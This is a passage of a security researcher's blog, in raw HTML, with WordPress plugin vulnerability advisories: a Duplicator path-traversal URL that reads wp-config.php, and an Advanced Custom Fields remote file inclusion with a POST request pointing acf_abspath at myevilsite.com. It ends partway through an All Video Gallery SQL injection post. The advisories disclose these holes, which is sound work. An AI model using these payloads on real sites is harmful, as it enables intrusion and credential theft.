id="crayon-53c98e78b8260737103191-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b8260737103191-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">print</span><span class="crayon-h"> </span><span class="crayon-v">$data</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b8260737103191-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e78b8260737103191-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b8260737103191-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">exit</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b8260737103191-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b8260737103191-26"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0073 seconds] -->
<p>If the &#8220;get&#8221; querystring parameter is set, it will read the file specified by the &#8220;file&#8221; querystring parameter and read that into the response as installer.php. But because this file is deployed by default to all installations and it does not sanitize the &#8220;file&#8221; variable, we can use it to read any arbitrary file by making a request like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b8270966753034" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
http://192.168.80.130/wordpress/wp-content/plugins/duplicator/files/installer.rescue.php?get=&amp;file=../../../../wp-config.php</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b8270966753034-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b8270966753034-1"><span class="crayon-i">http</span><span class="crayon-o">:</span><span class="crayon-c">//192.168.80.130/wordpress/wp-content/plugins/duplicator/files/installer.rescue.php?get=&amp;file=../../../../wp-config.php</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p>&nbsp;</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/duplicator/" rel="tag">Duplicator</a>, <a href="https://charlieeriksen.github.io/tag/file-disclosure/" rel="tag">File Disclosure</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2013/01/02/wordpress-duplicator-plugin-arbitrary-file-disclosure/#respond" title="Comment on WordPress Duplicator plugin arbitrary file disclosure">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-156 -->

				
					
<article id="post-200" class="post-200 post type-post status-publish format-standard hentry category-security tag-advanced-custom-fields tag-rfi tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/11/14/wordpress-advanced-custom-fields-remote-file-inclusion-vulnerability/" title="11:53 pm" rel="bookmark" class="entry-date"><time datetime="2012-11-14T23:53:36+00:00" pubdate>November 14, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2012/11/14/wordpress-advanced-custom-fields-remote-file-inclusion-vulnerability/" title="Permalink to WordPress Advanced Custom Fields remote file inclusion vulnerability" rel="bookmark">WordPress Advanced Custom Fields remote file inclusion vulnerability</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong></p>
<p><a href="http://secunia.com/advisories/51037">Secunia Advisory SA 51037</a></p>
<div><strong>Analysis of vulnerability</strong></div>
<div>A Remote File Inclusion vulnerability exists in the Advanced Custom Fields plugin for WordPress. By exploiting an unsafe use of array_merge which takes user-input in <a href="http://plugins.svn.wordpress.org/advanced-custom-fields/trunk/core/actions/export.php">/core/actions/export.php</a>, it is possible to override a value used for an include:</div>
<div></div>
<div>
<!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b87c3269542039" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// vars
$defaults = array(
	'acf_abspath' =&gt; '../../../../../',
	'acf_posts' =&gt; array()
);
$my_options = array_merge( $defaults, $_POST );

require_once( $my_options['acf_abspath'] . 'wp-load.php');
require_once( $my_options['acf_abspath'] . 'wp-admin/admin.php');</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b87c3269542039-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b87c3269542039-2">2</div><div class="crayon-num" data-line="crayon-53c98e78b87c3269542039-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b87c3269542039-4">4</div><div class="crayon-num" data-line="crayon-53c98e78b87c3269542039-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b87c3269542039-6">6</div><div class="crayon-num" data-line="crayon-53c98e78b87c3269542039-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b87c3269542039-8">8</div><div class="crayon-num" data-line="crayon-53c98e78b87c3269542039-9">9</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b87c3269542039-1"><span class="crayon-c">// vars</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b87c3269542039-2"><span class="crayon-v">$defaults</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span></div><div class="crayon-line" id="crayon-53c98e78b87c3269542039-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'acf_abspath'</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-s">'../../../../../'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b87c3269542039-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'acf_posts'</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c98e78b87c3269542039-5"><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b87c3269542039-6"><span class="crayon-v">$my_options</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">array_merge</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">$defaults</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b87c3269542039-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b87c3269542039-8"><span class="crayon-k ">require_once</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">$my_options</span><span class="crayon-sy">[</span><span class="crayon-s">'acf_abspath'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">'wp-load.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b87c3269542039-9"><span class="crayon-k ">require_once</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">$my_options</span><span class="crayon-sy">[</span><span class="crayon-s">'acf_abspath'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">'wp-admin/admin.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0030 seconds] -->
<br />
By posting another value for acf_abspath to the script, we can overwrite the value which is used for the two require_once calls. For instance, we can make a request like this which will request /wp-load.php and /wp-admin/admin.php from myevilsite.com:</p>
</div>
<div>
<!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b87d3163290346" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/advanced-custom-fields/core/actions/export.php HTTP/1.1
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

acf_abspath=http://myevilsite.com</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b87d3163290346-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b87d3163290346-2">2</div><div class="crayon-num" data-line="crayon-53c98e78b87d3163290346-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b87d3163290346-4">4</div><div class="crayon-num" data-line="crayon-53c98e78b87d3163290346-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b87d3163290346-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b87d3163290346-1">POST /wordpress/wp-content/plugins/advanced-custom-fields/core/actions/export.php HTTP/1.1</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b87d3163290346-2">Host: 192.168.80.130</div><div class="crayon-line" id="crayon-53c98e78b87d3163290346-3">Content-Type: application/x-www-form-urlencoded</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b87d3163290346-4">Content-Length: 37</div><div class="crayon-line" id="crayon-53c98e78b87d3163290346-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b87d3163290346-6">acf_abspath=http://myevilsite.com</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0004 seconds] -->
<br />
&nbsp;</p>
</div>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/security/" title="View all posts in Security" rel="category tag">Security</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/advanced-custom-fields/" rel="tag">Advanced Custom Fields</a>, <a href="https://charlieeriksen.github.io/tag/rfi/" rel="tag">RFI</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2012/11/14/wordpress-advanced-custom-fields-remote-file-inclusion-vulnerability/#respond" title="Comment on WordPress Advanced Custom Fields remote file inclusion vulnerability">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-200 -->

				
					
<article id="post-180" class="post-180 post type-post status-publish format-standard hentry category-advisories tag-all-video-gallery tag-sql-injection tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/11/04/wordpress-all-video-gallery-plugin-sql-injection/" title="5:50 pm" rel="bookmark" class="entry-date"><time datetime="2012-11-04T17:50:04+00:00" pubdate>November 4, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2012/11/04/wordpress-all-video-gallery-plugin-sql-injection/" title="Permalink to WordPress All Video Gallery Plugin SQL injection vulnerability" rel="bookmark">WordPress All Video Gallery Plugin SQL injection vulnerability</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong></p>
<p><a href="http://secunia.com/advisories/50874">Secunia Advisory SA50874</a></p>
<p><strong>Analysis of vulnerability</strong></p>
<p>The All Video Gallery Plugin has two pages, <a href="http://plugins.svn.wordpress.org/all-video-gallery/tags/1.1/playlist.php">playlist.php</a> and <a href="http://plugins.svn.wordpress.org/all-video-gallery/tags/1.1/xml/playlist.php">/xml/playlist.php</a>, which both takes a &#8220;vid&#8221; ID and outputs the result from the query into XML format.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b8e05205189372" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function buildNodes() {
	global $wpdb;

	$video = $wpdb-&gt;get_row("SELECT * FROM " . $wpdb-&gt;prefix . "allvideogallery_videos WHERE id=" . $_GET['vid']);
	$items = $wpdb-&gt;get_results("SELECT * FROM " . $wpdb-&gt;prefix . "allvideogallery_videos WHERE category='" . $video-&gt;category . "' AND id!=" . $_GET['vid']);
	$node  = '';

	for ($i = 0, $n = count($items); $i &lt; $n; $i++) {
		$item = $items[$i];

		$node .= '&lt;item&gt;'."\n";
		$node .= '&lt;thumb&gt;'.$item-&gt;thumb.'&lt;/thumb&gt;'."\n";
		$node .= '&lt;title&gt;'.$item-&gt;title.'&lt;/title&gt;'."\n";
		$node .= '&lt;link&gt;'.@add_query_arg( "slg", $item-&gt;slug, $_GET['page'] ).'&lt;/link&gt;'."\n";
		$node .= '&lt;/item&gt;'."\n";
	}

	return $node;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b8e05205189372-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b8e05205189372-36">36</div><div class="crayon-num" data-line="crayon-53c98e78b8e05205189372-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b8e05205189372-38">38</div><div class="crayon-num" data-line="crayon-53c98e78b8e05205189372-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b8e05205189372-40">40</div><div class="crayon-num" data-line="crayon-53c98e78b8e05205189372-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b8e05205189372-42">42</div><div class="crayon-num" data-line="crayon-53c98e78b8e05205189372-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b8e05205189372-44">44</div><div class="crayon-num" data-line="crayon-53c98e78b8e05205189372-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b8e05205189372-46">46</div><div class="crayon-num" data-line="crayon-53c98e78b8e05205189372-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b8e05205189372-48">48</div><div class="crayon-num" data-line="crayon-53c98e78b8e05205189372-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b8e05205189372-50">50</div><div class="crayon-num" data-line="crayon-53c98e78b8e05205189372-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b8e05205189372-52">52</div><div class="crayon-num" data-line="crayon-53c98e78b8e05205189372-53">53</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b8e05205189372-35"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">buildNodes</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b8e05205189372-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b8e05205189372-37">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b8e05205189372-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">video</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_row</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT * FROM "</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">"allvideogallery_videos WHERE id="</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'vid'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b8e05205189372-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">items</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_results</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT * FROM "</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">"allvideogallery_videos WHERE category='"</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">video</span><span class="crayon-o">-&gt;</span><span class="crayon-v">category</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">"' AND id!="</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'vid'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b8e05205189372-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">node</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b8e05205189372-41">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b8e05205189372-42"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">i</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">n</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">count</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">items</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">i</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">n</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">i</span><span class="crayon-o">++</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b8e05205189372-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">item</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">items</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-i">i</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b8e05205189372-44">&nbsp;</div><div class="crayon-line" id="crayon-53c98e78b8e05205189372-45"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">node</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'&lt;item&gt;'</span><span class="crayon-sy">.</span><span class="crayon-s">"\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b8e05205189372-46"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">node</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'&lt;thumb&gt;'</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">item</span><span class="crayon-o">-&gt;</span><span class="crayon-v">thumb</span><span class="crayon-sy">.</span><span class="crayon-s">'&lt;/thumb&gt;'</span><span class="crayon-sy">.</span><span class="crayon-s">"\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b8e05205189372-47"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">node</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'&lt;title&gt;'</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">item</span><span class="crayon-o">-&gt;</span><span class="crayon-v">title</span><span class="crayon-sy">.</span><span class="crayon-s">'&lt;/title&gt;'</span><span class="crayon-sy">.</span><span class="crayon-s">"\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b8e05205189372-48"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">node</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'&lt;link&gt;'</span><span class="crayon-sy">.</span><span class="crayon-sy">@</span><span class="crayon-e">add_query_arg</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-s">"slg"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">item</span><span class="crayon-o">-&gt;</span><span class="crayon-i">slug</span><span class="crayon-sy">,</span><span 